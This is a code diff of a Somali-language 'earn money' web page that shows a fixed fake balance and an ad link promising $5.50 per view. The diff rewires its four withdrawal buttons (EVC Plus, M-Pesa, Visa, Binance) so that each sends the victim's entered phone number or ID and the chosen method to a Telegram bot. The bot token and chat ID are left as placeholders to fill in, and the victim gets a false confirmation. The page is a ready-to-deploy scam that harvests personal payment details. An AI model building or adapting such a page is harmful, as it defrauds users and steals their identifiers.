@@ -5,35 +5,53 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Suldamada Global</title>
     <style>
-        body { background-color: #0d1117; color: white; font-family: sans-serif; display: flex; justify-content: center; padding: 20px; }
-        .app-container { width: 100%; max-width: 400px; }
-        .balance-card { background: linear-gradient(135deg, #ff5e00, #ff0055); padding: 25px; border-radius: 16px; margin-bottom: 20px; text-align: center; }
-        input { width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 8px; border: 1px solid #333; background: #161b22; color: white; box-sizing: border-box; }
-        .btn { width: 100%; padding: 15px; margin-bottom: 10px; border-radius: 8px; border: none; cursor: pointer; font-weight: bold; color: white; text-decoration: none; display: block; text-align: center; }
-        .btn-ad { background: #6366f1; }
-        .btn-evc { background: #008037; }
-        .btn-mpesa { background: #4caf50; }
-        .btn-visa { background: #1e3a8a; }
+        body { background: #0f172a; color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; padding: 20px; }
+        .app-container { width: 100%; max-width: 400px; background: #1e293b; padding: 20px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
+        .balance-card { background: linear-gradient(45deg, #f59e0b, #ec4899); padding: 25px; border-radius: 20px; text-align: center; margin-bottom: 20px; }
+        input { width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 12px; border: none; background: #334155; color: white; box-sizing: border-box; }
+        .btn { width: 100%; padding: 15px; margin-bottom: 10px; border-radius: 12px; border: none; cursor: pointer; font-weight: bold; color: white; transition: 0.3s; }
+        .btn:hover { opacity: 0.9; transform: scale(1.02); }
+        .btn-ad { background: #8b5cf6; }
+        .btn-evc { background: #10b981; }
+        .btn-mpesa { background: #f472b6; }
+        .btn-visa { background: #3b82f6; }
         .btn-binance { background: #f59e0b; }
     </style>
 </head>
 <body>
     <div class="app-container">
-        <h2>Suldamada Global</h2>
+        <h2 style="text-align:center">Suldamada Global</h2>
         <div class="balance-card">
             <p>Haraagaaga</p>
             <h1>$<span id="balance">32.75</span></h1>
         </div>
         
-        <!-- Xayeysiiskaaga rasmiga ah -->
         <a href="https://omg10.com/4/11075110" target="_blank" class="btn btn-ad">Watch Ad to Earn $5.50</a>
         
         <input type="text" id="phone" placeholder="Geli lambarkaaga ama ID-gaaga">
         
-        <button class="btn btn-evc" onclick="alert('Codsigaaga waa la gudbiyay')">Withdraw EVC Plus</button>
-        <button class="btn btn-mpesa" onclick="alert('Codsigaaga waa la gudbiyay')">Withdraw M-Pesa</button>
-        <button class="btn btn-visa" onclick="alert('Codsigaaga waa la gudbiyay')">Withdraw Visa</button>
-        <button class="btn btn-binance" onclick="alert('Codsigaaga waa la gudbiyay')">Withdraw Binance Pay</button>
+        <button class="btn btn-evc" onclick="sendToTelegram('EVC Plus')">Withdraw EVC Plus</button>
+        <button class="btn btn-mpesa" onclick="sendToTelegram('M-Pesa')">Withdraw M-Pesa</button>
+        <button class="btn btn-visa" onclick="sendToTelegram('Visa')">Withdraw Visa</button>
+        <button class="btn btn-binance" onclick="sendToTelegram('Binance')">Withdraw Binance</button>
     </div>
+
+    <script>
+        function sendToTelegram(method) {
+            let phone = document.getElementById('phone').value;
+            if (phone.length < 5) {
+                alert("Fadlan geli lambar sax ah!");
+                return;
+            }
+            
+            // HALKAN GELI TOKEN-KA IYO CHAT ID-GAAGA
+            let token = "YOUR_BOT_TOKEN";
+            let chat_id = "YOUR_CHAT_ID";
+            let msg = `Lacag Cusub:%0ALambarka: ${phone}%0AHabka: ${method}`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${msg}`);
+            alert("Mahadsanid! Codsigaaga " + method + " waa la gudbiyay.");
+        }
+    </script>
 </body>
 </html>
